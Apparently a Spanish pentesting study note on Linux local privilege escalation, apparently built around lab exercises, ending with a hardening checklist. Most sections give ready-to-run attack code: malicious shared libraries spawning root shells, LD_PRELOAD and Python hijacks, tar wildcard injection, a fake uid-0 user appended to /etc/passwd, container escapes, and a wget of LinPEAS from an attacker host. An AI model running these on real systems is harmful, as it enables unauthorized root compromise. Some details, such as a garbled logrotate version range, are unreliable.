> [!WARNING]
> La escalada de privilegios local (LPE) consiste en pasar de un usuario con bajos permisos a **root**. En Linux, casi nunca requiere exploits sofisticados: la mayoría de las veces es una mala configuración en sudo, un binario SUID innecesario, un cron job con permisos débiles o credenciales en texto claro en un archivo de configuración. La clave es la **enumeración sistemática**.

---
# 0. Enumeración

Para atacar un sistema Linux debemos hacernos estas preguntas:

1️⃣ **¿Quienes somos? ¿Pertenecemos a algun grupo importante?** Por ejemplo: `adm`, `lxd`, `docker`, `shadow`,

2️⃣ **¿Cuál es la versión del kernel?** A lo mejor es vulnerable.

3️⃣ **¿Qué podemos ejecutar como sudo?**
- Puede que tenga una explotación en gtfobins
- Puede que permita ejecutar comandos o leer archivos de root con alguna opción rara
- ¿Hay alguna opción para editar variables como `LD_PRELOAD`o `SETENV`?
- Si es un python, puede que sea escribible o que por ejemplo cargue una librería mal protegida

4️⃣ **¿Se ejecuta alguna capability especial?**
- Si es un lenguaje de programación puede que tenga exploit en gtfobins
- Si no, puede que tenga alguna que le permita acceder a algun archivo privilegiado o algo

5️⃣ **¿Hay algun comando SUID?**
- Si es un script puede que tenga malos permisos o ejecute otro script con malos permisos
- Puede que ejecute un binario con una ruta relativa > Path hijacking
- Puede que cargue una librería en un path vulnerable o que se pueda cambiar el path
- Si es un python, puede que cargue alguna librería mal protegida
- Puede que permita ejecutar comandos o leer archivos de root con alguna opción rara

6️⃣ **¿Hay alguna tarea cron que se ejecute como un usuario privilegiado?**
- Si es un script puede que tenga malos permisos o ejecute otro script con malos permisos
- Puede que ejecute un comando con un `*`, de lo que uno se podrá aprovechar
- Puede que sea un software con algun exploit como `rotate`

7️⃣ **¿Qué software hay instalado?** Por ejemplo la versión 4.05.00 de Screen permite una escalada

8️ **¿Tiene el sistema NICs adicionales en otras subredes?** Podemos usar `route`, `netstat -rn` o `arp` para numerar
- Esto permite posible movimiento lateral
- A lo mejor hay una aplicación vulnerable corriendo en el localhost

9️⃣ **¿Y en cuanto a archivos?**
- ¿Hay algo raro en el historial o en la bash de nuestro usuario?
- ¿Podemos acceder a alguna clave SSH mal protegida o contraseña harcodeada en algun archivo? Mirar sobre todo archivos de configuración
- ¿Hay algun archivo backup interesante? No hay que descuidarlos

--------

# 1. 🔑 Binarios SUID

> [!CAUTION]
Los binarios con SUID se ejecutan con los privilegios del propietario (normalmente root), independientemente de quién los invoque.

-------
## 1.1. 🔒 Abuso de SUID/SGID - Gtfobins

> 🔎 **Enumeración**: Para encontrar binarios SUID hay que utilizar este filtro: `find / -perm -4000 -type f 2>/dev/null`

Luego buscamos el vector SUID en [GTFObins]([GTFOBins](https://gtfobins.org/#//^suid$)). 

Por ejemplo find con SUID se explotaría así:
```
find . -exec /bin/bash -p \; -quit
```

-------
## 1.2. 📚 SUID en binario que carga shared libraries

> 🔎 **Enumeración**: Primero vemos que librerías carga un binario SUID
```bash
strace /usr/local/bin/suid_app 2>&1 | grep "open.*\.so.*ENOENT"
ldd /usr/local/bin/suid_app
# libshared.so => /development/libshared.so (0x00007f0c13112000)
# /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

Si busca una .so que existe en una ruta escribible podemos plantar la .so maliciosa en la ruta dónde la busca
```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor)); void inject() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /development/libshared.so /tmp/evil.c 
/usr/local/bin/suid_app
```

-------
## 1.3. Dumpeo de memorias

Tenemos un binario que lee un archivo para decir su cantidad de lineas, mientras que esta corriendo, lee el archivo, por tanto este estara en su memoria hasta que finalice el proceso. Si lo hacemos crasehar, podremos ver esa memoria antes de ser eliminada.
```shell
./count
Enter path:  /root/.ssh/id_rsa   # Como es SUID lo puede leer, pero no servirá de mucho
^Z [1]+ Stopped
ps | grep "count"           # -> 2213 pts/4 00:00:00 count
kill -SIGSEGV 2213; fg      # -> Bus error, core dumped
cd /var/crash; ls           # -> count.1000.crash
apport-unpack /var/crash/count.1000.crash /tmp/crash-report
strings /tmp/crash-report/CoreDump # -> Todo el archivo :)
```

-------
## 1.4. Shared Object Hijacking

Tenemos un suid raro y vemos sus librerías con `ldd`, encontramos que carga la librería `glibc` (como es normal) y otra que una que no es de las estandares. La examinamos con `readelf`
```bash
ldd payroll
# libshared.so => /development/libshared.so (0x00007f0c13112000)
# /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

readelf -d payroll  | grep PATH
# 0x000000000000001d (RUNPATH)    Library runpath: [/development]
```

Utiliza `RUNPATH` para cargarse desde una ubicacion personalizada ¿El problema? Que la carpeta `/development` tiene permisos de escritura para el resto de usuarios. Así que un atacante puede colocar ahí una librería maliciosa, y como se verifican primero las librerías en esa ubicación, se procede al secuestro.

Antes de compilar una biblioteca, necesitamos encontrar el nombre de la función que es llamada por el binario. Para ello hacemos una copia de libc en ese directorio con el nombe de la librería rara y vemos que se queja porque no encuentra la función `dbquery`
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll 
# ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Entonces el código de la librería es ídentico al anterior, solo que con este nombre para la función main
```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void dbquery() { setresuid(0,0,0); system("/bin/bash -p"); }
EOF
gcc /tmp/evil.c -fPIC -shared -o /development/libshared.so
./payroll
```

-------
# 2. 🔒 Abuso de capabilities

Las capabilities son más sigilosas que SUID porque no aparecen en un `ls -la`. Hay que buscarlas explícitamente.

| Capability peligrosa                | Binario             | Explotación                                                    |
| ----------------------------------- | ------------------- | -------------------------------------------------------------- |
| `cap_setuid+ep`<br>`cap_setguid+ep` | python3, perl, ruby | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_net_raw+ep`                    | tcpdump, python3    | Sniffing de tráfico de red                                     |
| `cap_dac_read_search+ep`            | tar, python3        | Leer cualquier archivo ignorando permisos                      |
| `cap_sys_admin+ep`                  | cualquiera          | Casi equivalente a root                                        |
| `cap_dac_override`                  | cualquiera          | Permite saltarse los permisos y privilegios de los archivos    |

Las capabilities se asignan con el valor `+ep`, que hace que sean efectivas o `+ei` para que los procesos hijo las hereden

--------
## 2.1. 🔒 Abuso de capabilities - Gtfobins

La mayoría de explotaciones las encontramos en [GTFObins]([GTFOBins](https://gtfobins.org/#//^capabilities$))

Ejemplo con  **cap_dac_read_search**:
```bash
tar -cvf shadow.tar /etc/shadow 2>/dev/null && tar -xvf shadow.tar && cat etc/shadow # tar
vim /etc/shadow # vim
```

-------
## 2.2. 🔒 Abuso de capabilities - Otros

**Si no esta en gtfobins, se busca manualmente:**

```bash
getcap /usr/bin/vim.basic
# /usr/bin/vim.basic cap_dac_override=eip
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

-------
# 3. 🔒 Abuso de sudo

`sudo -l` es **siempre el primer comando** a ejecutar. Muestra qué puede hacer el usuario actual como root.

```bash
sudo -l
# Ejemplo de salida peligrosa:
# (ALL) NOPASSWD: /usr/bin/vim
# (ALL) /usr/bin/python3
```

--------
## 3.1. Abuso de parámetros

> [!WARNING]
> Todas las herramientas que permitan spawnear una shell o leer un archivo comprometido son propensas a escalada

La mayoría los encontraremos en [GTFOBins](https://gtfobins.github.io/). Por ejemplo `vim` se explotaría así: `sudo vim -c ':!/bin/bash'` 

Otros, hay que leer las opciones con `--help`, por ejemplo `ncdu` permite hacerlo presionando la tecla `b`. 

-------
## 3.2. sudo con Ld preload

> [!WARNING]
Cuando un programa se compila, puede usar varios métodos para buscar las librerías dinámicas.  **La variable `LD_PRELOAD` es muy importate ya que permite especificar de dónde cargar la librería antes de ejecutar el binario,** 

¿Y si creamos una librería maliciosa y le decimos al sistema que la cargue? 

Si `sudo -l` muestra `env_keep+=LD_PRELOAD`, se puede precargar una librería maliciosa antes de ejecutar cualquier comando sudo. Por ejemplo, permite ejecutar openssl como root, que no es un binario que tenga via de escalada por gtfobins
```bash
cat sudoers
# Defaults:antonio env_keep+=LD_PRELOAD
# antonio ALL=(root) SETENV: /usr/bin/openssl
```

Creamos la lubrería maliciosa y la cargamos
```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/openssl
```

-------
## 3.3 Python library hijacking

> [!WARNING]
Python, contiene muchas librerías para poder trabajar, como `requests`. Una de ellas, la más importante es la **Biblioteca Estándar,** con muchos módulos incluidos desde una instalación estándar de Python
> 
Si el código python se ejecuta como root a través de sudo o por una tarea cron, podemos considerar atacarlo de manera indirecta, ya que no tiene permisos de escritura. 

Por razones de seguridad, Linux ignora por defecto el bit SUID en los scripts interpretados. Para que el bit SUID realmente nos conceda privilegios elevados aquí, necesitaría estar configurado directamente en el propio ejecutable de Python `/usr/bin/python3)`

```bash
sudo -l
#  (ALL) NOPASSWD: /usr/bin/python3 /home/paco/mem_status.py

ls /home/paco/programa.py
# -rwsrwxr-x 1 root root 188 Dec 13 20:13 mem_status.py

cat /home/paco/programa.py
# #!/usr/bin/env python3
# import psutil
# available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
# print(f"Available memory: {round(available_memory, 2)}%")
```

También podemos ver en la segunda línea que importa el módulo `psutil` y utiliza la función `virtual_memory()`.

--------
### 3.3.1. Permisos de escritura inseguros en el módulo de python

> [!CAUTION]
Esto permite que pueda ser manipulado para insertar código malicioso. Este tipo de permisos son más comunes en entornos de desarrollo donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir privilegios más altos.

Así que podemos buscar esta función en la carpeta de psutil y comprobar si este módulo tiene permisos de escritura para nosotros.

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/*/psutil/* | awk -F ":" '{print $1}' | xargs ls -l
# -rw-r--r-- 1 htb-student staff 87657 Jun  8  2023 /usr/local/lib/.../__init__.py
# (...)
```

Abrimos el módulo y justo debajo de `def virtual_memory():` ponemos `import os; os.system('/bin/bash -p')` y cargamos el python. Si nos sale que somos root, le metemos algun payload como hacer la bash suid.
```bash
sudo /usr/bin/python3 /home/htb-student/mem_status.py
bash-5.0#
```

--------
### 3.3.2. Ruta de búsqueda de bibliotecas de Pythonn

> [!CAUTION]
En Python, cada versión tiene un orden específico en el que se buscan e importan las bibliotecas (módulos). Esto se basa en el PATH propio de python o `PYTHONPATH`. 
> 
> Lo podemos imprimir con `python3 -c 'import sys; print("\n".join(sys.path))'` y saldrá una lista de rutas dónde las más altas tienen prioridad sobre las que están más abajo

Para poder utilizar esta variante, es necesario que podamos editar una de las rutas con mayor prioridad que la del módulo cargado. En este caso, crearemos un módulo malicioso que se llame igual.
```bash
pip3 show psutil | grep location
# Location: /usr/local/lib/python3.8/dist-packages
```

Vemos que el directorio `/usr/lib/python3.8` es editable y tiene más prioridad. Creamos `psutil.py` con la función a la que se llama (`virtual_memory`)
```bash
#!/usr/bin/env python3
def virtual_memory():
    import os; os.system('id')
```

--------
### 3.3.3. Variable de entorno PYTHONPATH

> [!CAUTION]
PYTHONPATH es una variable de entorno que indica en qué directorio (o directorios) puede buscar Python los módulos. Si un usuario puede manipular esta variable mientras ejecuta el binario de python, podrá apuntar a la ubicación que quiera. 


Podemos ver si podemos editar variables de entorno para el binario de python  con el `sudo`
```bash
sudo -l 
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Por tanto, la editamos para apuntar al script que hicimos en la anterior sección, pero que hemos movido a `/tmp/psutil.py`
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

--------
# 4. 🔒 Abuso de cron jobs

Los cron jobs suelen ejecutarse como root. Si el script que ejecutan es modificable o está en una ruta controlable, se obtiene ejecución como root. 

Podemos encontrar scrips de cron en la ruta `/etc/cron.d/*` o en `/etc/crontab`.
Tambien podemos monitorear procesos  en tiempo real con la herramienta `./pspy64` O crear un script como `procmon.sh`
```bash
old_process=$(ps -eo user,command)
while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon.sh|kworker|command|defunct"
	old_process=$new_process
done
```

--------
## 4.1. Path hijacking

> [!CAUTION]
Si se invoca un comando por su ruta relativa  (`ls` no `/bin/ls`) el sistema lo buscará dentro de las rutas listadas en el PATH. Ejecutará por tanto el primero que encuentre.

Por ejemplo vemos en sudoers o en tareas cron este script `/usr/local/bin/system_status.sh`  y ejecuta `free -m`

O dentro de un SUID encontramos con strings que ejecuta otro comando `strings /usr/local/bin/binario | grep -v "^/"` y ejecuta `free -m`

```bash
# 1. Tenemos que crear en temp o el directorio actual un script de bash que se llame igual: 
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/free && chmod +x !$

# 2. Luego actualizamos el path para que priorice nuestra locaclización
export PATH=.:${PATH}

# 3. Ejecutamos o esperamos a que se ejecute y tendremos una bash SUID
```

--------
## 4.2. Permisos incorrectos

Encontramos este crontab de root `* * * * * /opt/scripts/backup.sh`
1. Puede que el script o la ruta tenga permisos de escritura → `echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh`
2. O que ejecute un binario SUID al que podamos hacer un **path hijacking**

--------
## 4.3. Wildcard abuse

Tenemos un cronjob que ejecuta esto. Lo que nos llama la atención es el wildcard (`*`) y que se ejecuta en un directorio donde tenemos permisos de escritura
```bash
*/01 * * * * cd /home/kali && tar -zcf /home/kali/backup.tar.gz *
```

Tar tiene las opciones `--chekpoint` y `--checkpoint-action` que ejecutan comandos. Al expandir `*`, tar interpreta los nombres de archivo como opciones
```bash
echo 'chmod +s /bin/bash' > /home/kali/shell.sh && chmod +x !$
touch /home/kali/--checkpoint=1 && touch /home/kali/--checkpoint-action=exec=sh\ shell.sh
```

En nuestro home se habran creado `backup.tar.gz` y `--checkpoint=1` y `--checkpoint-action=exec=sh`, dos archivos que se interpretan como parametros por culpa del `*`

--------
## 4.4. Logrotate

En todos los sistemas Linux, se crean logs kilométricos. Para evitar que saturen el disco, la herramienta `logrotate` elimina los  mas viejos. Esta herramienta toma como factores el tamaño del log, su antiguedad y que hacer cuando estos dos lleguen a cierto tope. Para operar, lo que hace es renombrar los logs viejos, los borra y crea unos nuevos. Esta herramienta funciona por `cron` y se configura con `/etc/logrotate.conf`

> Para explotar esto necesitamos permisos de escritura en los logs, que la herramienta corra como root y que sea de la versión 3.8.6 a la 2.18.0

Existe este exploit  [logrotten](https://github.com/whotwagner/logrotten). que podemos compilar y subir al sistema. Luego, escribir un payload y detetminar la opción que usa logrotate para adaptar el exploit
```bash
git clone https://github.com/whotwagner/logrotten.git cd !$ 
gcc logrotten.c -o exploit
grep "create\|compress" /etc/logrotate.conf | grep -v "#" # sale create

echo 'if [ `id -u` -eq 0 ]; then (cp /dev/shm/passwd /etc/passwd &); fi' > payloadfile 
echo 'hack:<hash>:0:0:attacker:/root:/bin/bash' >> /dev/shm/passwd # openssl passwd -1 Password1
echo "trigger rotation" >> ~/backups/access.log
/exploit -p payloadfile /home/htb-student/backups/access.log
watch -n 1 ls -lah /etc/bash_completion.d # vemos hasta que salga hack -> su hack
```

--------
## 4.6. 🧱 Timers de Systemd escribibles

Los timers de systemd son el equivalente moderno a cron. Si un archivo `.service` o `.timer` es escribible.
1. Buscamos units escribibles  `find /etc/systemd/ /lib/systemd/ -writable 2>/dev/null`
2. Si el archivo .service de un timer es escribible , modificamos su ExecStart para ejecutar nuestro payload
```bash
[Service]
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
```
3. Luego esperamos que el timer dispare o lo forzamos: `systemctl daemon-reload && systemctl start nombre.service` y tendremos la bash SUID


--------
# 5. 👥 Abuso de grupos especiales

Algunos grupos dan acceso a recursos que equivalen a root en la práctica.

Grupo `shadow`: Puede leer `/etc/shadow` directamente

## 5.1. Grupo adm

Puede leer logs del sistema que pueden contener credenciales
```bash
cat /var/log/auth.log      # intentos de login, comandos sudo...
cat /var/log/syslog
grep -i "password\|pass\|user" /var/log/auth.log
```

--------
## 5.2. Grupo docker
1. Podemos montar el filesystem del host en un contenedor 
```bash
docker run -v /:/host --rm -it alpine chroot /host bash 
```

2. O crear un SUID desde el contenedor
```bash
docker run -v /:/host --rm alpine sh -c "cp /bin/bash /host/tmp/bash && chmod 4755 /host/tmp/bash" && /tmp/bash -p
```

--------
## 5.3. Grupo lxd (Ubuntu)
Podemos importar una imagen minimal y montarla el host
```bash
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh # → en el contenedor: /mnt/root es el / del host con privilegios root
```

--------
## 5.4. Grupo disk

Da acceso directo al dispositivo de bloque → leer cualquier archivo
```bash
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

--------
# 6. 📂 Archivos y directorios con permisos débiles

## 6.1. passwd escribible
Se puede añadir un usuario con UID 0 directamente (sin tocar `/etc/shadow`).
```bash
# Generar hash de contraseña (openssl legacy pero funciona) → $1$hack$...
openssl passwd -1 -salt wtf "pass" 

# Añadir usuario root falso
echo 'wtf:$1$wtf$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd 
su wtf   # contraseña: pass → shell root
```

--------
## 6.2. 💥shadow legible
Se pueden tratar de romper los hashes
```bash
unshadow /etc/passwd /etc/shadow > hashes.txt # Crackear hashes con John o Hashcat
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

--------
## 6.3. sudoers escribible
Se pueden añadir usuarios con permiso de sudo
```bash
echo 'jessica ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && sudo bash
```

> [!WARNING]
Otro archivo es el de las claves públicas `authorized_keys`, para poder autenticarnos con kali sin proporcionar contrasela

--------
# 7. 💻 Exploits de kernel

El kernel exploit es el último recurso: es ruidoso, puede crashear el sistema y requiere versión exacta. Solo cuando todo lo demás falla.

Para ello enumeramos nuestro sistema:
```bash
uname -r
uname -a
cat /proc/version
./linux-exploit-suggester.sh # Usar linux-exploit-suggester:
```

Por tanto tenemos estos exploits históricos

| CVE            | Nombre          | Versiones vulnerables | Compilación               | Url exploit                                                                                                   |
| -------------- | --------------- | --------------------- | ------------------------- | ------------------------------------------------------------------------------------------------------------- |
| CVE-2021-4034  | Polkit PwnKit   | polkit < 0.119        | `gcc --static`            | [exploit](https://github.com/arthepsy/CVE-2021-4034)                                                          |
| CVE-2022-0847  | Dirty Pipe      | kernel 5.8 - 5.17     |                           | [exploit](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)                                    |
| CVE-2021-3156  | Baron Samedit   | sudo < 1.9.5p2        | `make`                    | [exploit](https://github.com/blasty/CVE-2021-3156)                                                            |
| CVE-2016-5195  | Dirty COW       | kernel < 4.8.3        | `gcc -pthread -lcrypt`    |                                                                                                               |
| CVE-2023-0386  | OverlayFS       | kernel < 6.2          |                           |                                                                                                               |
| CVE-2019-14287 | sudo id exploit | sudo < 1.8.28         | `sudo -u#-1 <sudo_bin>`   |                                                                                                               |
| CVE-2021-22555 | netfilter1      | kernel 2.6 - 5.11     | `gcc -m32 -static`        | [este](https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c) |
| CVE-2022-25636 | netfilter 2     | kernel 5.4 - 5.6.10   | `make`                    | [este](https://github.com/Bonfee/CVE-2022-25636.git)                                                          |
| CVE-2023-32233 | netfilter 3     | kernel < 6.3.1        | `gcc -Wall -lmnl -lnftnl` | [este](https://github.com/Liuk3r/CVE-2023-32233)                                                              |

Podemos descargar un exploit en c y hacer un compilado stático para subirlo. Puede que para algunos haya que actualizar el PATH
```bash
gcc kernel_exploit.c -o kernel_exploit --static
export PATH="$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8" # actualizar el path
```

--------
## 7.1. 💥PwnKit (CVE-2021-4034)

> [!WARNING]
> PwnKit (CVE-2021-4034) es una vulnerabilidad del binario "pkexec" que nos permite la escalada de privilegios a "root". Esta vulnerabilidad llevaba presente en el código de pkexec desde su creación, en 2009 y no se descubrió hasta enero de 2022. 

Sabemos que cuando Linux ejecuta un programa, le entrega principalmente dos listas: los argumentos y las variables de entorno. Estos elementos, modifican el comportamiento del programa. En memoria, tras los argumentos `argv[]`  están las variables de entorno `envp[]`. pkexec asumía incorrectamente que siempre recibiría al menos un argumento que indicase el programa que debía ejecutar. 

Sin embargo, si se indicaba que no había argumentos `argc = 0`, el programa trataba de ejecutar lo siguiente que estuviera en memoria ¿Qué era? Un variable de entorno, en concreto, `GCONV_PATH` que indica la codificación a utilizar para imprimir un error. Lo que haya en esa variable por tanto se entendía como el argumento 1, o sea el programa que pkexec debería ejecutar como root gracias al bit SUID

--------
## 7.2. 💥DirtyCow

Supongamos que nuestro proceso quiere acceder a un archivo que puede leer, pero no modificar, como **/etc/passwd**. El proceso es el siguiente:
1. **Creación del mapeo privado:** La operación **mmap** busca una zona libre en la memoria virtual del proceso y la relaciona con las páginas donde está temporalmente el archivo en la RAM (memoria física).
2. **Copy-on-write (COW):** Si el proceso quiere escribir en el archivo, el kernel debe crear una copia privada de la página y escribir sobre ella, no sobre el archivo orignal.

La falla viene cuando se ejecutan dos hilos que constantemente hacen esto:
1. **Hilo 1: operación (madvise(MADV_DONTNEED)):** Permite comunicarle al kernel que ya no se necesitan ciertas páginas del mapeo y que descarte la copia privada. Si el proceso quiere volver a acceder, se recuperará el contenido **desde el archivo original**.
2. **Hilo 2: Provocar la escritura (write):** Se pueden utilizar dos métodos para intentar escribir en la dirección donde está mapeado el archivo. Para ello se puede usar
- El archivo **/proc/self/mem** que representa la memoria virtual del proceso
- **ptrace** dónde se crea un proceso depurador que modifique su memoria.


--------
# 7 .💻 Entorno

## 7.1 💻 Restricted shells

Una restricted shell es un tipo de shell que solo permite ciertas comandos o estar en ciertos directorios. Tenemos rbash, rksh y rzsh. Con `compgen -g`  podemos ver los comandos que podemos usar

- **Command injection.** En nuestra shell solo podemos hacer `ls`, pero si hacemos ` ls -l ´pwd´` (backticks)  haremos que se ejecute `ls -l` seguido del output de `pwd`
- **Command substitution**: imaginemos que la shell mete nuestros comandos en backticks, pues lo que habría que hacer es cerrar esas backticks
- Encadenamiento de comandos: podemos encadenar comandos con oneliners gracias a `;` o `|`
- Environment Variables: si las limitaciones vienen de variables de entorno que nos digan por ejemplo en que directorio ejecutar comandos, podemos modifcarlas.
- Funciones. `func() { echo ¨"hi" }`
- Podemos tratar de ejecutar otras shells como `sh` 

-----
## 7.2 💻 Multiplexadores

Tmux permite dejar una sesión en segundo plano. Si root crea una sesión privilegiada con malos permisos, podremos 

Por ejemplo root hace esto
```bash
tmux -S /shareds new -s debugsess 
chown root:devs /shareds
```

Pero nosotros estamos en el grupo `devs`
```bash
ps aux | grep tmux
root      4806  0.0  0.1  29416  3204 ?   (...) tmux -S /shareds new -s debugsess
tmux -S /shareds
```


--------
# 8. 🔧 Enumeración automática

En lugar de lanzar los comandos manualmente uno a uno, estas herramientas automatizan toda la enumeración:

| Herramienta                 | Uso            | Destaca por                                                              |
| --------------------------- | -------------- | ------------------------------------------------------------------------ |
| **LinPEAS**                 | `./linpeas.sh` | Enumeración exhaustiva, colorea por criticidad. La más completa          |
| **LinEnum**                 | `./LinEnum.sh` | Más antigua, más simple, menos ruido                                     |
| **linux-exploit-suggester** | `./les.sh`     | Especializado en sugerir exploits de kernel por versión                  |
| **pspy**                    | `./pspy64`     | Monitoriza procesos en tiempo real sin ser root. Indispensable para cron |
| **GTFOBins**                | web            | Referencia de binarios SUID/sudo explotables                             |

```bash
# Subir herramientas al objetivo (desde atacante)
python3 -m http.server 8080

# En el objetivo
cd /tmp
wget http://10.10.10.10:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
```

# 9 Hardening

1. Actualizaciones y Parches
☐ Mantener el sistema actualizado regularmente.  
☐ Aplicar parches de seguridad lo antes posible.  
☐ Automatizar las actualizaciones con `unattended-upgrades`.
2. Gestión de la Configuración
☐ Auditar archivos y directorios con permisos de escritura inseguros.  
☐ Revisar binarios con el bit **SUID** activado.
☐ Usar rutas absolutas en: reglas de sudo y cronjobs
☐ No almacenar contraseñas o secretos en texto plano.  
☐ Restringir el acceso a archivos sensibles.
☐ Limpiar directorios `home` de archivos innecesarios.  
☐ Eliminar o revisar el historial de Bash (`~/.bash_history`).
☐ Verificar que usuarios sin privilegios no puedan modificar librerías utilizadas por programas privilegiados.
☐ Desinstalar paquetes innecesarios.  
☐ Deshabilitar servicios que no se utilicen.
☐ Implementar **SELinux** (o AppArmor) para añadir controles de acceso obligatorios.
3. Gestión de Usuarios
☐ Reducir al mínimo las cuentas de usuario y administrador.
☐ Registrar y monitorizar intentos de inicio de sesión (correctos e incorrectos).
☐ Aplicar políticas de contraseñas robustas.  
☐ Priorizar frases de contraseña largas frente a cambios frecuentes.  
☐ Impedir la reutilización de contraseñas mediante: `/etc/security/opasswd` y PAM
☐ Revisar los grupos a los que pertenece cada usuario.  
☐ Aplicar el principio de **mínimo privilegio**.  
☐ Limitar los permisos de `sudo`.
☐ Automatizar auditorías con herramientas como: puppet, saltstack, zabbix, nagios
☐ Verificar la integridad de binarios mediante checksums (ej. `vfs.file.cksum` en Zabbix).
4. Auditoría
☐ Realizar auditorías de seguridad y configuración.
☐ Utilizar referencias como: DISA STIGs, ISO 27001, PCI-DSS o HIPAA
☐ Complementar las auditorías con: Escaneos de vulnerabilidades, Pentests, Gestión de parches, -estión de configuración

La herramienta es útil para informar sobre las rutas de escalada de privilegios y para realizar una comprobación rápida de la configuración, y realizará aún más comprobaciones si se ejecuta como usuario root.  
```bash
./lynis audit system
```


---
## 🔗 Ver también
- [[Linux; gestión de identidades]]
- [[Linux;  Procesos, redes y servicios]]
- [[Docker]]
- [[Windows; Escalada de privilegios]]





